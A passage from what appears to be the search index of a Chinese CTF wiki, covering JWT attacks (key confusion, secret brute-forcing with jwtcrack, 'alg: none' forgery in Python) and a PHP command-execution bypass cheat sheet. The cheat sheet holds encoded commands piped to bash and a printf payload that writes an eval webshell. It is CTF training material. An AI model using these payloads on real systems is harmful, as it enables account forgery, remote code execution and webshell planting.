HMAC \u662f\u4e00\u79cd\u5bf9\u79f0\u7b97\u6cd5, \u53cc\u65b9\u4e4b\u95f4\u4ec5\u5171\u4eab\u4e00\u4e2a \u5bc6\u94a5\u3002\u7531\u4e8e\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u94a5\u751f\u6210\u7b7e\u540d\u548c\u9a8c\u8bc1\u7b7e\u540d, \u56e0\u6b64\u5fc5\u987b\u6ce8\u610f\u786e\u4fdd\u5bc6\u94a5\u4e0d\u88ab\u6cc4\u5bc6\u3002 \u5728\u5f00\u53d1\u5e94\u7528\u7684\u65f6\u5019\u542f\u7528JWT\uff0c\u4f7f\u7528RS256\u66f4\u52a0\u5b89\u5168\uff0c\u4f60\u53ef\u4ee5\u63a7\u5236\u8c01\u80fd\u4f7f\u7528\u4ec0\u4e48\u7c7b\u578b\u7684\u5bc6\u94a5\u3002\u53e6\u5916\uff0c\u5982\u679c\u4f60\u65e0\u6cd5\u63a7\u5236\u5ba2\u6237\u7aef\uff0c\u65e0\u6cd5\u505a\u5230\u5bc6\u94a5\u7684\u5b8c\u5168\u4fdd\u5bc6\uff0cRS256\u4f1a\u662f\u4e2a\u66f4\u4f73\u7684\u9009\u62e9\uff0cJWT\u7684\u4f7f\u7528\u65b9\u53ea\u9700\u8981\u77e5\u9053\u516c\u94a5\u3002 \u7531\u4e8e\u516c\u94a5\u901a\u5e38\u53ef\u4ee5\u4ece\u5143\u6570\u636eURL\u8282\u70b9\u83b7\u5f97\uff0c\u56e0\u6b64\u53ef\u4ee5\u5bf9\u5ba2\u6237\u7aef\u8fdb\u884c\u8fdb\u884c\u7f16\u7a0b\u4ee5\u81ea\u52a8\u68c0\u7d22\u516c\u94a5\u3002\u5982\u679c\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u4ece\u670d\u52a1\u5668\u4e0a\u76f4\u63a5\u4e0b\u8f7d\u516c\u94a5\u4fe1\u606f\uff0c\u53ef\u4ee5\u6709\u6548\u7684\u51cf\u5c11\u914d\u7f6e\u4fe1\u606f\u3002","title":"\u524d\u8a00"},{"location":"CTFWiki/Web/JWT/\u5bc6\u94a5\u6df7\u6dc6\u653b\u51fb/#_3","text":"\u6b64\u653b\u51fb\u7684\u539f\u56e0\u662f\u67d0\u4e9b\u5e93\u5bf9\u7b7e\u540d/\u9a8c\u8bc1HMAC\u5bf9\u79f0\u52a0\u5bc6\u7684\u5bc6\u94a5\u548c\u5305\u542b\u7528\u4e8e\u9a8c\u8bc1RSA\u7b7e\u540d\u4ee4\u724c\u7684\u516c\u94a5\u7684\u5bc6\u94a5\u4f7f\u7528\u76f8\u540c\u7684\u53d8\u91cf\u540d\u3002 \u901a\u8fc7\u5c06\u7b97\u6cd5\u8c03\u6574\u4e3aHMAC\u53d8\u4f53\uff08HS256/HS384/HS512\uff09\u5e76\u4f7f\u7528\u516c\u5171\u53ef\u7528\u516c\u94a5\u5bf9\u5176\u8fdb\u884c\u7b7e\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u6b3a\u9a97\u670d\u52a1\u4f7f\u7528\u673a\u5bc6\u53d8\u91cf\u4e2d\u7684\u786c\u7f16\u7801\u516c\u94a5\u9a8c\u8bc1HMAC\u4ee4\u724c\u3002","title":"\u5229\u7528"},{"location":"CTFWiki/Web/JWT/\u5bc6\u94a5\u6df7\u6dc6\u653b\u51fb/#wp","text":"\u7531\u4e8ejwt\u5728python\u548cnodejs\u7684\u5e93\u4e0d\u540c\uff0c\u9020\u6210\u5728\u8fd9\u91cc\u53ea\u80fd\u81ea\u5df1\u624b\u52a8\u751f\u6210\u4e86,\u4e4b\u540e\u8fd0\u884cnodejs\u83b7\u53d6cookie\u53bb\u66ff\u6362\u5373\u53ef router . get ( '/' , function ( req , res , next ) { res . type ( 'html' ); var cert = fs . readFileSync ( process . cwd () + '//routes/public.key' ); var token = jwt . sign ({ user : 'admin' }, cert , { algorithm : 'HS256' }); res . cookie ( 'auth' , token ); res . end ( 'where is flag?' ); });","title":"WP"},{"location":"CTFWiki/Web/JWT/\u5bc6\u94a5\u6df7\u6dc6\u653b\u51fb/#_4","text":"JWT\u914d\u7f6e\u5e94\u8be5\u53ea\u5141\u8bb8\u4f7f\u7528HMAC\u7b97\u6cd5\u6216\u516c\u94a5\u7b97\u6cd5\uff0c\u51b3\u4e0d\u80fd\u540c\u65f6\u4f7f\u7528\u8fd9\u4e24\u79cd\u7b97\u6cd5","title":"\u5982\u4f55\u9632\u5fa1"},{"location":"CTFWiki/Web/JWT/\u7206\u7834\u5bc6\u94a5/","text":"\u7206\u7834\u5bc6\u94a5 \u00b6 \u5bc6\u94a5\u7206\u7834i\u5de5\u5177:(\u4e00\u822c\u7b2c\u4e00\u4e2a\u7528\u7684\u6bd4\u8f83\u591a\uff0c\u5176\u4ed6\u6211\u4e5f\u6ca1\u7528\u8fc7) c-jwt-cracker Hashcat john \u770b\u89c1\u9898\u5e72\u8bf4\u662f\u7206\u7834\uff0c\u731c\u90fd\u731c\u51fa\u6765\u5bc6\u94a5\u4e86\u5176\u5b9e ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYwOTIzNzc0OSwiZXhwIjoxNjA5MjQ0OTQ5LCJuYmYiOjE2MDkyMzc3NDksInN1YiI6InVzZXIiLCJqdGkiOiI0ZDJlZWMwNDRiM2MxNTRjNmRjYmM5NzUzMmE3MmU3OCJ9.D0-CXOY9O1SvOvYqwYkUZ-ruOMbOMPh3dzOKiOamt2s Secret is \"aaab\" \u5f97\u5230\u5bc6\u94a5aaab\uff0c\u62ff\u53bb\u751f\u6210\u5373\u53ef","title":"\u7206\u7834\u5bc6\u94a5"},{"location":"CTFWiki/Web/JWT/\u7206\u7834\u5bc6\u94a5/#_1","text":"\u5bc6\u94a5\u7206\u7834i\u5de5\u5177:(\u4e00\u822c\u7b2c\u4e00\u4e2a\u7528\u7684\u6bd4\u8f83\u591a\uff0c\u5176\u4ed6\u6211\u4e5f\u6ca1\u7528\u8fc7) c-jwt-cracker Hashcat john \u770b\u89c1\u9898\u5e72\u8bf4\u662f\u7206\u7834\uff0c\u731c\u90fd\u731c\u51fa\u6765\u5bc6\u94a5\u4e86\u5176\u5b9e ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYwOTIzNzc0OSwiZXhwIjoxNjA5MjQ0OTQ5LCJuYmYiOjE2MDkyMzc3NDksInN1YiI6InVzZXIiLCJqdGkiOiI0ZDJlZWMwNDRiM2MxNTRjNmRjYmM5NzUzMmE3MmU3OCJ9.D0-CXOY9O1SvOvYqwYkUZ-ruOMbOMPh3dzOKiOamt2s Secret is \"aaab\" \u5f97\u5230\u5bc6\u94a5aaab\uff0c\u62ff\u53bb\u751f\u6210\u5373\u53ef","title":"\u7206\u7834\u5bc6\u94a5"},{"location":"CTFWiki/Web/JWT/\u7b7e\u540d\u7b97\u6cd5\u53ef\u88ab\u4fee\u6539\u4e3anone/","text":"\u7b7e\u540d\u7b97\u6cd5\u53ef\u88ab\u4fee\u6539\u4e3anone \u00b6 \u524d\u8a00 \u00b6 JWT\u652f\u6301\u5c06\u7b97\u6cd5\u8bbe\u5b9a\u4e3a\u201cNone\u201d\u3002\u5982\u679c\u201calg\u201d\u5b57\u6bb5\u8bbe\u4e3a\u201c None\u201d\uff0c\u90a3\u4e48\u7b7e\u540d\u4f1a\u88ab\u7f6e\u7a7a\uff0c\u8fd9\u6837\u4efb\u4f55token\u90fd\u662f\u6709\u6548\u7684\u3002 \u8bbe\u5b9a\u8be5\u529f\u80fd\u7684\u6700\u521d\u76ee\u7684\u662f\u4e3a\u4e86\u65b9\u4fbf\u8c03\u8bd5\u3002\u4f46\u662f\uff0c\u82e5\u4e0d\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u5173\u95ed\u8be5\u529f\u80fd\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5c06alg\u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u201cNone\u201d\u6765\u4f2a\u9020\u4ed6\u4eec\u60f3\u8981\u7684\u4efb\u4f55token\uff0c\u63a5\u7740\u4fbf\u53ef\u4ee5\u4f7f\u7528\u4f2a\u9020\u7684token\u5192\u5145\u4efb\u610f\u7528\u6237\u767b\u9646\u7f51\u7ad9\u3002 \u5f00\u59cb\u505a\u9898 \u00b6 \u9996\u5148\u62ff\u5230cookie eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYwOTIzNjg3MCwiZXhwIjoxNjA5MjQ0MDcwLCJuYmYiOjE2MDkyMzY4NzAsInN1YiI6InVzZXIiLCJqdGkiOiI5NDNkMGIzMjM3ODA2NjU5ZDJlMjA1ZTQyYjMxOTQ5NCJ9.9TUQLyYKs97ceFhZQ4BzkAuug6nCgLoMAbLH88kSOwo \u89e3\u7801 { \"alg\": \"HS256\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1609236870, \"exp\": 1609244070, \"nbf\": 1609236870, \"sub\": \"user\", \"jti\": \"943d0b3237806659d2e205e42b319494\" } \u6211\u4eec\u9700\u8981\u628asub\u5b57\u6bb5\u6539\u4e3aadmin \u4f46\u662f\u5982\u679c\u628a\u7b7e\u540d\u7b97\u6cd5\u6539\u4e3anone\u7684\u5316jwt.io\u90a3\u4e2a\u7f51\u7ad9\u5c31\u65e0\u6cd5\u751f\u6210\uff0c\u8fd9\u4e2a\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528python\u751f\u6210 import jwt # payload token_dict = { \"iss\" : \"admin\" , \"iat\" : 1609236870 , \"exp\" : 1609244070 , \"nbf\" : 1609236870 , \"sub\" : \"admin\" , \"jti\" : \"943d0b3237806659d2e205e42b319494\" } headers = { \"alg\" : \"none\" , \"typ\" : \"JWT\" } jwt_token = jwt . encode ( token_dict , # payload, \u6709\u6548\u8f7d\u4f53 \"\" , # \u8fdb\u884c\u52a0\u5bc6\u7b7e\u540d\u7684\u5bc6\u94a5 algorithm = \"none\" , # \u6307\u660e\u7b7e\u540d\u7b97\u6cd5\u65b9\u5f0f, \u9ed8\u8ba4\u4e5f\u662fHS256 headers = headers # json web token \u6570\u636e\u7ed3\u6784\u5305\u542b\u4e24\u90e8\u5206, payload(\u6709\u6548\u8f7d\u4f53), headers(\u6807\u5934) ) print ( jwt_token ) \u5c06\u751f\u6210\u7684\u5b57\u7b26\u4e32\u6765\u66ff\u6362\u539f\u6709\u7684cookie\u83b7\u5f97flag","title":"\u7b7e\u540d\u7b97\u6cd5\u53ef\u88ab\u4fee\u6539\u4e3anone"},{"location":"CTFWiki/Web/JWT/\u7b7e\u540d\u7b97\u6cd5\u53ef\u88ab\u4fee\u6539\u4e3anone/#none","text":"","title":"\u7b7e\u540d\u7b97\u6cd5\u53ef\u88ab\u4fee\u6539\u4e3anone"},{"location":"CTFWiki/Web/JWT/\u7b7e\u540d\u7b97\u6cd5\u53ef\u88ab\u4fee\u6539\u4e3anone/#_1","text":"JWT\u652f\u6301\u5c06\u7b97\u6cd5\u8bbe\u5b9a\u4e3a\u201cNone\u201d\u3002\u5982\u679c\u201calg\u201d\u5b57\u6bb5\u8bbe\u4e3a\u201c None\u201d\uff0c\u90a3\u4e48\u7b7e\u540d\u4f1a\u88ab\u7f6e\u7a7a\uff0c\u8fd9\u6837\u4efb\u4f55token\u90fd\u662f\u6709\u6548\u7684\u3002 \u8bbe\u5b9a\u8be5\u529f\u80fd\u7684\u6700\u521d\u76ee\u7684\u662f\u4e3a\u4e86\u65b9\u4fbf\u8c03\u8bd5\u3002\u4f46\u662f\uff0c\u82e5\u4e0d\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u5173\u95ed\u8be5\u529f\u80fd\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5c06alg\u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u201cNone\u201d\u6765\u4f2a\u9020\u4ed6\u4eec\u60f3\u8981\u7684\u4efb\u4f55token\uff0c\u63a5\u7740\u4fbf\u53ef\u4ee5\u4f7f\u7528\u4f2a\u9020\u7684token\u5192\u5145\u4efb\u610f\u7528\u6237\u767b\u9646\u7f51\u7ad9\u3002","title":"\u524d\u8a00"},{"location":"CTFWiki/Web/JWT/\u7b7e\u540d\u7b97\u6cd5\u53ef\u88ab\u4fee\u6539\u4e3anone/#_2","text":"\u9996\u5148\u62ff\u5230cookie eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYwOTIzNjg3MCwiZXhwIjoxNjA5MjQ0MDcwLCJuYmYiOjE2MDkyMzY4NzAsInN1YiI6InVzZXIiLCJqdGkiOiI5NDNkMGIzMjM3ODA2NjU5ZDJlMjA1ZTQyYjMxOTQ5NCJ9.9TUQLyYKs97ceFhZQ4BzkAuug6nCgLoMAbLH88kSOwo \u89e3\u7801 { \"alg\": \"HS256\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1609236870, \"exp\": 1609244070, \"nbf\": 1609236870, \"sub\": \"user\", \"jti\": \"943d0b3237806659d2e205e42b319494\" } \u6211\u4eec\u9700\u8981\u628asub\u5b57\u6bb5\u6539\u4e3aadmin \u4f46\u662f\u5982\u679c\u628a\u7b7e\u540d\u7b97\u6cd5\u6539\u4e3anone\u7684\u5316jwt.io\u90a3\u4e2a\u7f51\u7ad9\u5c31\u65e0\u6cd5\u751f\u6210\uff0c\u8fd9\u4e2a\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528python\u751f\u6210 import jwt # payload token_dict = { \"iss\" : \"admin\" , \"iat\" : 1609236870 , \"exp\" : 1609244070 , \"nbf\" : 1609236870 , \"sub\" : \"admin\" , \"jti\" : \"943d0b3237806659d2e205e42b319494\" } headers = { \"alg\" : \"none\" , \"typ\" : \"JWT\" } jwt_token = jwt . encode ( token_dict , # payload, \u6709\u6548\u8f7d\u4f53 \"\" , # \u8fdb\u884c\u52a0\u5bc6\u7b7e\u540d\u7684\u5bc6\u94a5 algorithm = \"none\" , # \u6307\u660e\u7b7e\u540d\u7b97\u6cd5\u65b9\u5f0f, \u9ed8\u8ba4\u4e5f\u662fHS256 headers = headers # json web token \u6570\u636e\u7ed3\u6784\u5305\u542b\u4e24\u90e8\u5206, payload(\u6709\u6548\u8f7d\u4f53), headers(\u6807\u5934) ) print ( jwt_token ) \u5c06\u751f\u6210\u7684\u5b57\u7b26\u4e32\u6765\u66ff\u6362\u539f\u6709\u7684cookie\u83b7\u5f97flag","title":"\u5f00\u59cb\u505a\u9898"},{"location":"CTFWiki/Web/RCE/\u547d\u4ee4\u6267\u884cBypass/","text":"\u547d\u4ee4\u6267\u884cBypass \u00b6 \u9488\u5bf9\u60c5\u51b5 \u00b6 \u8fd9\u91cc\u4e3b\u8981\u9488\u5bf9 system(\"$a\"); \u53d8\u91cfa\u53ef\u63a7\u7684\u8fd9\u79cd\u60c5\u51b5\uff0c\u8fd9\u91cc\u4ec5\u4ec5\u5c06\u4e00\u4e9b\u5e38\u89c1\u7684\u60c5\u51b5\uff0c\u7279\u6b8a\u60c5\u51b5\u6211\u4eec\u5355\u72ec\u8bb2\u89e3 \u7ed5\u8fc7\u7a7a\u683c \u00b6 \u5e38\u89c1\u7684\u7ed5\u8fc7\u7b26\u53f7\u6709\uff1a $IFS$9 \u3001${IFS} \u3001%09(php\u73af\u5883\u4e0b)\u3001 \u91cd\u5b9a\u5411\u7b26<>\u3001<\u3001 #$IFS\u5728linux\u4e0b\u8868\u793a\u5206\u9694\u7b26\uff0c\u5982\u679c\u4e0d\u52a0{}\u5219bash\u4f1a\u5c06IFS\u89e3\u91ca\u4e3a\u4e00\u4e2a\u53d8\u91cf\u540d\uff0c \u52a0\u4e00\u4e2a{}\u5c31\u56fa\u5b9a\u4e86\u53d8\u91cf\u540d\uff0c$IFS$9\u540e\u9762\u4e4b\u6240\u4ee5\u52a0\u4e2a$\u662f\u4e3a\u4e86\u8d77\u5230\u622a\u65ad\u7684\u4f5c\u7528 \u547d\u4ee4\u5206\u9694 \u00b6 %0a --\u6362\u884c\u7b26\uff0c\u9700\u8981php\u73af\u5883 %0d --\u56de\u8f66\u7b26\uff0c\u9700\u8981php\u73af\u5883 ; --\u5728 shell \u4e2d\uff0c\u662f\u201d\u8fde\u7eed\u6307\u4ee4\u201d & --\u4e0d\u7ba1\u7b2c\u4e00\u6761\u547d\u4ee4\u6210\u529f\u4e0e\u5426\uff0c\u90fd\u4f1a\u6267\u884c\u7b2c\u4e8c\u6761\u547d\u4ee4 && --\u7b2c\u4e00\u6761\u547d\u4ee4\u6210\u529f\uff0c\u7b2c\u4e8c\u6761\u624d\u4f1a\u6267\u884c | --\u7b2c\u4e00\u6761\u547d\u4ee4\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u7b2c\u4e8c\u6761\u547d\u4ee4\u7684\u8f93\u5165 || --\u7b2c\u4e00\u6761\u547d\u4ee4\u5931\u8d25\uff0c\u7b2c\u4e8c\u6761\u624d\u4f1a\u6267\u884c \u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u7ed5\u8fc7 \u00b6 whoa'm'i whoa\"m\"i \u8bfb\u53d6\u6587\u4ef6\u7684\u51fd\u6570 \u00b6 strings:\u8bfb\u53d6\u5176\u4e2d\u5b57\u7b26\u4e32 more:\u4e00\u9875\u4e00\u9875\u7684\u663e\u793a\u6863\u6848\u5185\u5bb9 less:\u4e0e more \u7c7b\u4f3c head:\u67e5\u770b\u5934\u51e0\u884c tac:\u4ece\u6700\u540e\u4e00\u884c\u5f00\u59cb\u663e\u793a\uff0c\u53ef\u4ee5\u770b\u51fa tac \u662f cat \u7684\u53cd\u5411\u663e\u793a tail:\u67e5\u770b\u5c3e\u51e0\u884c nl\uff1a\u663e\u793a\u7684\u65f6\u5019\uff0c\u987a\u4fbf\u8f93\u51fa\u884c\u53f7 od:\u4ee5\u4e8c\u8fdb\u5236\u7684\u65b9\u5f0f\u8bfb\u53d6\u6863\u6848\u5185\u5bb9 vi:\u4e00\u79cd\u7f16\u8f91\u5668\uff0c\u8fd9\u4e2a\u4e5f\u53ef\u4ee5\u67e5\u770b vim:\u4e00\u79cd\u7f16\u8f91\u5668\uff0c\u8fd9\u4e2a\u4e5f\u53ef\u4ee5\u67e5\u770b sort:\u53ef\u4ee5\u67e5\u770b uniq:\u53ef\u4ee5\u67e5\u770b file -f:\u62a5\u9519\u51fa\u5177\u4f53\u5185\u5bb9 grep 1\u3001\u5728\u5f53\u524d\u76ee\u5f55\u4e2d\uff0c\u67e5\u627e\u540e\u7f00\u6709 file \u5b57\u6837\u7684\u6587\u4ef6\u4e2d\u5305\u542b test \u5b57\u7b26\u4e32\u7684\u6587\u4ef6\uff0c\u5e76\u6253\u5370\u51fa\u8be5\u5b57\u7b26\u4e32\u7684\u884c\u3002\u6b64\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a grep test *file strings \u7ed5\u8fc7\u6b63\u5219\u5339\u914d \u00b6 \u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 ? , * \uff0c\u4f7f\u7528\u8f6c\u4e49\u5b57\u7b26 \\ (\u5728linux\u91cc\u9762\u6267\u884c whoami = whoam\\i ) \u4e3e\u4e2a\u7b80\u5355\u4f8b\u5b50 <?php error_reporting ( 0 ); if ( isset ( $_GET [ 'c' ])){ $c = $_GET [ 'c' ]; if ( ! preg_match ( \"/flag/i\" , $c )){ eval ( $c ); } } else { highlight_file ( __FILE__ ); } \u59ff\u52bf\u5f88\u591a \u901a\u914d\u7b26 payload1:c=system(\"nl fla?????\"); payload2:c=system(\"nl fla*\"); payload3:c=echo `nl fl''ag.php`;\u6216\u8005c=echo `nl fl\u201c\u201dag.php`; payload4:c=echo `nl fl\\ag.php`;//\u8f6c\u4e49\u5b57\u7b26\u7ed5\u8fc7 payload5:c=include($_GET[1]);&1=php://filter/read=convert.base64-encode/resource=flag.php payload6:c=eval($_GET[1]);&1=system('nl flag.php'); payload7:c=awk '{printf $0}' flag.php|| \u8fd8\u6709\u5f88\u591a\u59ff\u52bf\uff0c\u6bd5\u7adf\u7b49\u4e8e\u6ca1\u8fc7\u6ee4 \u5f53\u7136\u8fd8\u53ef\u4ee5\u7f16\u7801\u7ed5\u8fc7 #base64 echo \"Y2F0IC9mbGFn\"|base64 -d|bash ==>cat /flag echo Y2F0IC9mbGFn|base64 -d|sh==>cat /flag #hex echo \"0x636174202f666c6167\" | xxd -r -p|bash ==>cat /flag #oct/\u5b57\u8282 $(printf \"\\154\\163\") ==>ls $(printf \"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\") ==>cat /flag {printf,\"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\"}|\\$0 ==>cat /flag #i\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u5199\u9a6c \u5185\u5bb9\u4e3a <?php @ eval ( $_POST [ 'c' ]); ?> ${printf,\"\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\"} >> 1.php \u901a\u914d\u7b26 \u00b6 linux\u91cc\u6709\u4e24\u4e2a\u901a\u914d\u7b26 ? \u548c * \u524d\u8005\u4ee3\u88680\u6216\u4e00\u4e2a\u5b57\u7b26\uff0c\u540e\u8005\u4ee3\u8868\u4efb\u610f\u4e2a\u5b57\u7b26 /???/????64 ???????? \u770b\u5230\u4e0a\u9762\u8fd9\u4e2a\u4e86\u5417\uff0c\u6bd4\u8f83\u7279\u6b8a\u6307\u7684\u662f /bin/base64 \u5f53\u7136\u4e0d\u662f\u6bcf\u4e2a\u7cfb\u7edf\u90fd\u6709","title":"\u547d\u4ee4\u6267\u884cBypass"},{"location":"CTFWiki/Web/RCE/\u547d\u4ee4\u6267\u884cBypass/#bypass","text":"","title":"\u547d\u4ee4\u6267\u884cBypass"},{"location":"CTFWiki/Web/RCE/\u547d\u4ee4\u6267\u884cBypass/#_1","text":"\u8fd9\u91cc\u4e3b\u8981\u9488\u5bf9 system(\"$a\"); \u53d8\u91cfa\u53ef\u63a7\u7684\u8fd9\u79cd\u60c5\u51b5\uff0c\u8fd9\u91cc\u4ec5\u4ec5\u5c06\u4e00\u4e9b\u5e38\u89c1\u7684\u60c5\u51b5\uff0c\u7279\u6b8a\u60c5\u51b5\u6211\u4eec\u5355\u72ec\u8bb2\u89e3","title":"\u9488\u5bf9\u60c5\u51b5"},{"location":"CTFWiki/Web/RCE/\u547d\u4ee4\u6267\u884cBypass/#_2","text":"\u5e38\u89c1\u7684\u7ed5\u8fc7\u7b26\u53f7\u6709\uff1a $IFS$9 \u3001${IFS} \u3001%09(php\u73af\u5883\u4e0b)\u3001 \u91cd\u5b9a\u5411\u7b26<>\u3001<\u3001 #$IFS\u5728linux\u4e0b\u8868\u793a\u5206\u9694\u7b26\uff0c\u5982\u679c\u4e0d\u52a0{}\u5219bash\u4f1a\u5c06IFS\u89e3\u91ca\u4e3a\u4e00\u4e2a\u53d8\u91cf\u540d\uff0c \u52a0\u4e00\u4e2a{}\u5c31\u56fa\u5b9a\u4e86\u53d8\u91cf\u540d\uff0c$IFS$9\u540e\u9762\u4e4b\u6240\u4ee5\u52a0\u4e2a$\u662f\u4e3a\u4e86\u8d77\u5230\u622a\u65ad\u7684\u4f5c\u7528","title":"\u7ed5\u8fc7\u7a7a\u683c"},{"location":"CTFWiki/Web/RCE/\u547d\u4ee4\u6267\u884cBypass/#_3","text":"%0a --\u6362\u884c\u7b26\uff0c\u9700\u8981php\u73af\u5883 %0d --\u56de\u8f66\u7b26\uff0c\u9700\u8981php\u73af\u5883 ; --\u5728 shell \u4e2d\uff0c\u662f\u201d\u8fde\u7eed\u6307\u4ee4\u201d & --\u4e0d\u7ba1\u7b2c\u4e00\u6761\u547d\u4ee4\u6210\u529f\u4e0e\u5426\uff0c\u90fd\u4f1a\u6267\u884c\u7b2c\u4e8c\u6761\u547d\u4ee4 && --\u7b2c\u4e00\u6761\u547d\u4ee4\u6210\u529f\uff0c\u7b2c\u4e8c\u6761\u624d\u4f1a\u6267\u884c | --\u7b2c\u4e00\u6761\u547d\u4ee4\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u7b2c\u4e8c\u6761\u547d\u4ee4\u7684\u8f93\u5165 || --\u7b2c\u4e00\u6761\u547d\u4ee4\u5931\u8d25\uff0c\u7b2c\u4e8c\u6761\u624d\u4f1a\u6267\u884c","title":"\u547d\u4ee4\u5206\u9694"},{"location":"CTFWiki/Web/RCE/\u547d\u4ee4\u6267\u884cBypass/#_4","text":"whoa'm'i whoa\"m\"i","title":"\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u7ed5\u8fc7"},{"location":"CTFWiki/Web/RCE/\u547d\u4ee4\u6267\u884cBypass/#_5","text":"strings:\u8bfb\u53d6\u5176\u4e2d\u5b57\u7b26\u4e32 more:\u4e00\u9875\u4e00\u9875\u7684\u663e\u793a\u6863\u6848\u5185\u5bb9 less:\u4e0e more \u7c7b\u4f3c head:\u67e5\u770b\u5934\u51e0\u884c tac:\u4ece\u6700\u540e\u4e00\u884c\u5f00\u59cb\u663e\u793a\uff0c\u53ef\u4ee5\u770b\u51fa tac \u662f cat \u7684\u53cd\u5411\u663e\u793a tail:\u67e5\u770b\u5c3e\u51e0\u884c nl\uff1a\u663e\u793a\u7684\u65f6\u5019\uff0c\u987a\u4fbf\u8f93\u51fa\u884c\u53f7 od:\u4ee5\u4e8c\u8fdb\u5236\u7684\u65b9\u5f0f\u8bfb\u53d6\u6863\u6848\u5185\u5bb9 vi:\u4e00\u79cd\u7f16\u8f91\u5668\uff0c\u8fd9\u4e2a\u4e5f\u53ef\u4ee5\u67e5\u770b vim:\u4e00\u79cd\u7f16\u8f91\u5668\uff0c\u8fd9\u4e2a\u4e5f\u53ef\u4ee5\u67e5\u770b sort:\u53ef\u4ee5\u67e5\u770b uniq:\u53ef\u4ee5\u67e5\u770b file -f:\u62a5\u9519\u51fa\u5177\u4f53\u5185\u5bb9 grep 1\u3001\u5728\u5f53\u524d\u76ee\u5f55\u4e2d\uff0c\u67e5\u627e\u540e\u7f00\u6709 file \u5b57\u6837\u7684\u6587\u4ef6\u4e2d\u5305\u542b test \u5b57\u7b26\u4e32\u7684\u6587\u4ef6\uff0c\u5e76\u6253\u5370\u51fa\u8be5\u5b57\u7b26\u4e32\u7684\u884c\u3002\u6b64\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a grep test *file strings","title":"\u8bfb\u53d6\u6587\u4ef6\u7684\u51fd\u6570"},{"location":"CTFWiki/Web/RCE/\u547d\u4ee4\u6267\u884cBypass/#_6","text":"\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 ? , * \uff0c\u4f7f\u7528\u8f6c\u4e49\u5b57\u7b26 \\ (\u5728linux\u91cc\u9762\u6267\u884c whoami = whoam\\i ) \u4e3e\u4e2a\u7b80\u5355\u4f8b\u5b50 <?php error_reporting ( 0 ); if ( isset ( $_GET [ 'c' ])){ $c = $_GET [ 'c' ]; if ( ! preg_match ( \"/flag/i\" , $c )){ eval ( $c ); } } else { highlight_file ( __FILE__ ); } \u59ff\u52bf\u5f88\u591a \u901a\u914d\u7b26 payload1:c=system(\"nl fla?????\"); payload2:c=system(\"nl fla*\"); payload3:c=echo `nl fl''ag.php`;\u6216\u8005c=echo `nl fl\u201c\u201dag.php`; payload4:c=echo `nl fl\\ag.php`;//\u8f6c\u4e49\u5b57\u7b26\u7ed5\u8fc7 payload5:c=include($_GET[1]);&1=php://filter/read=convert.base64-encode/resource=flag.php payload6:c=eval($_GET[1]);&1=system('nl flag.php'); payload7:c=awk '{printf $0}' flag.php|| \u8fd8\u6709\u5f88\u591a\u59ff\u52bf\uff0c\u6bd5\u7adf\u7b49\u4e8e\u6ca1\u8fc7\u6ee4 \u5f53\u7136\u8fd8\u53ef\u4ee5\u7f16\u7801\u7ed5\u8fc7 #base64 echo \"Y2F0IC9mbGFn\"|base64 -d|bash ==>cat /flag echo Y2F0IC9mbGFn|base64 -d|sh==>cat /flag #hex echo \"0x636174202f666c6167\" | xxd -r -p|bash ==>cat /flag #oct/\u5b57\u8282 $(printf \"\\154\\163\") ==>ls $(printf \"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\") ==>cat /flag {printf,\"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\"}|\\$0 ==>cat /flag #i\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u5199\u9a6c \u5185\u5bb9\u4e3a <?php @ eval ( $_POST [ 'c' ]); ?> ${printf,\"\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\"} >> 1.php","title":"\u7ed5\u8fc7\u6b63\u5219\u5339\u914d"},{"location":"CTFWiki/Web/RCE/\u547d\u4ee4\u6267\u884cBypass/#_7","text":"linux\u91cc\u6709\u4e24\u4e2a\u901a\u914d\u7b26 ? \u548c * \u524d\u8005\u4ee3\u88680\u6216\u4e00\u4e2a\u5b57\u7b26\uff0c\u540e\u8005\u4ee3\u8868\u4efb\u610f\u4e2a\u5b57\u7b26 /???/????64 ???????? 